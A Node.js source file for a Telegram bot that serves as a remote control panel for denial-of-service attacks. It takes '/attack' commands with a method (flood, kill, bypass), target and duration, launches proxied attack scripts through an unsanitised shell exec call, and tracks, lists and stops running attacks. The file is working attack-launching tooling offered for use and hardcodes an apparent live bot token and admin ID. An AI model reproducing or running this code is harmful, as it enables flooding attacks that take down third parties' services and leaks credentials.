const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const si = require('systeminformation');
const express = require('express');
const app = express();
const bot = new TelegramBot('7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0');
const ADMIN_ID = '6601930239';
const PORT = process.env.PORT || 8080;
const WEBHOOK_URL = process.env.RAILWAY_URL ? `${process.env.RAILWAY_URL}/bot${bot.token}` : `https://your-railway-app.railway.app/bot${bot.token}`;

let attacks = [];

app.use(express.json());
app.post(`/bot${bot.token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

app.get('/', (req, res) => res.send('Bot is running'));

bot.setWebHook(WEBHOOK_URL);

function bytesToSize(bytes) {
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  if (bytes === 0) return '0 Byte';
  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
  return Math.round(bytes / Math.pow(1024, i), 2) + ' ' + sizes[i];
}

bot.on('message', async (msg) => {
  const userId = msg.from.id.toString();
  if (userId !== ADMIN_ID) return bot.sendMessage(msg.chat.id, 'Access denied.');

  if (!msg.text.startsWith('/')) return;
  const args = msg.text.slice(1).split(' ');
  const command = args.shift().toLowerCase();
  const chatId = msg.chat.id;

  if (command === 'attack') {
    const [method, target, time] = args;
    if (!['flood', 'kill', 'bypass'].includes(method) || !target || !time || isNaN(time) || parseInt(time) <= 0) {
      return bot.sendMessage(chatId, 'Usage: /attack [method](flood,kill,bypass) [target] [time]');
    }

    const rate = 25;
    const thread = 10;
    const proxyfile = 'prx.txt';
    const attack = { method, target, time: parseInt(time), rate, thread, proxyfile, messageId: null, status: 'start', process: null };
    attacks.push(attack);

    const embed = {
      parse_mode: 'Markdown',
      text: `*🔴 Attack Sent*\n*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}s\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}`
    };

    const sentMessage = await bot.sendMessage(chatId, embed.text, { parse_mode: embed.parse_mode });
    attack.messageId = sentMessage.message_id;

    setTimeout(async () => {
      attack.status = 'run';
      attack.time -= 5;
      await bot.editMessageText(
        `*🔴 Attack Sent*\n*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}s\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}`,
        { chat_id: chatId, message_id: attack.messageId, parse_mode: 'Markdown' }
      );

      const interval = setInterval(async () => {
        attack.time -= 5;
        if (attack.time <= 0 || !attacks.includes(attack)) {
          clearInterval(interval);
          attacks = attacks.filter(a => a !== attack);
          await bot.deleteMessage(chatId, attack.messageId);
          await bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} completed.`);
          return;
        }

        await bot.editMessageText(
          `*Status*: ${attack.status}\n*Method*: ${attack.method}\n*Target*: ${attack.target}\n*Time*: ${attack.time}s\n*Rate*: ${attack.rate}\n*Thread*: ${attack.thread}\n*Proxyfile*: ${attack.proxyfile}`,
          { chat_id: chatId, message_id: attack.messageId, parse_mode: 'Markdown' }
        );
      }, 5000);

      attack.process = exec(`node ${method}.js ${target} ${time} ${rate} ${thread} ${proxyfile}`, (error) => {
        if (error) {
          clearInterval(interval);
          attacks = attacks.filter(a => a !== attack);
          bot.deleteMessage(chatId, attack.messageId);
          bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} failed.`);
        }
      });
    }, 5000);
  }

  if (command === 'list') {
    if (attacks.length === 0) {
      return bot.sendMessage(chatId, 'No active attacks.');
    }

    const text = attacks.map((attack, index) => `*Attack ${index}*\nMethod: ${attack.method}\nTarget: ${attack.target}\nTime: ${attack.time}s\nStatus: ${attack.status}`).join('\n\n');
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  }

  if (command === 'stop') {
    const index = parseInt(args[0]);
    if (isNaN(index) || index < 0 || index >= attacks.length) {
      return bot.sendMessage(chatId, 'Invalid attack index.');
    }

    const attack = attacks[index];
    if (attack.process) attack.process.kill();
    attacks = attacks.filter(a => a !== attack);
    await bot.deleteMessage(chatId, attack.messageId);
    await bot.sendMessage(chatId, `Attack ${attack.method} on ${attack.target} stopped.`);
  }

  if (command === 'system') {
    const systemInfo = await si.get({
      cpu: 'manufacturer,brand,speed,cores',
      mem: 'total,free,used',
      fsSize: 'fs,size,used,available',
      osInfo: 'platform,distro,release'
    });

    const formattedInfo = {
      cpu: {
        manufacturer: systemInfo.cpu.manufacturer,
        brand: systemInfo.cpu.brand,
        speed: systemInfo.cpu.speed,
        cores: systemInfo.cpu.cores
      },
      memory: {
        total: bytesToSize(systemInfo.mem.total),
        free: bytesToSize(systemInfo.mem.free),
        used: bytesToSize(systemInfo.mem.used)
      },
      disk: systemInfo.fsSize.map(disk => ({
        fs: disk.fs,
        size: bytesToSize(disk.size),
        used: bytesToSize(disk.used),
        available: bytesToSize(disk.available)
      })),
      os: {
        platform: systemInfo.osInfo.platform,
        distro: systemInfo.osInfo.distro,
        release: systemInfo.osInfo.release
      }
    };

    bot.sendMessage(chatId, `*System*: \`\`\`json\n${JSON.stringify(formattedInfo, null, 2)}\n\`\`\``, { parse_mode: 'Markdown' });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
